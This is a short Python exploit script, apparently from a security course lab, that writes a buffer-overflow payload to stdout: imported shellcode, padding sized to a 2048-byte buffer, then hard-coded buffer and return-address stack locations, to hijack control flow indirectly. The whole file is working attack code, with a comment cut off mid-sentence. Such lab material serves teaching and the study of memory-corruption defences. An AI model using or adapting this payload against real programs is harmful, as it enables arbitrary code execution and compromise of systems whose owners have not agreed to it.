#!/usr/bin/env python3
from shellcode import shellcode
import sys

"""
Indirect Control-Flow Hijacking Demonstration
---------------------------------------------

This payload demonstrates how control flow can be hijacked even when
direct overwrite of the return address is restricted.
"""

# 0x7ffffff29258 return address on stack
# 0x7ffffff28a40 address of buffer

# We know that buf holds 2048, and the shellcode has its own length. The rest is the padding that will overflow until it reaches a
padding = 2048 - len(shellcode)

# same as target 2 but input the address of the buf followed by the address of the return on stack
sys.stdout.buffer.write(shellcode + b"A" * padding + 0x7ffffff28a40.to_bytes(8, "little") + 0x7ffffff29258.to_bytes(8, "little"))

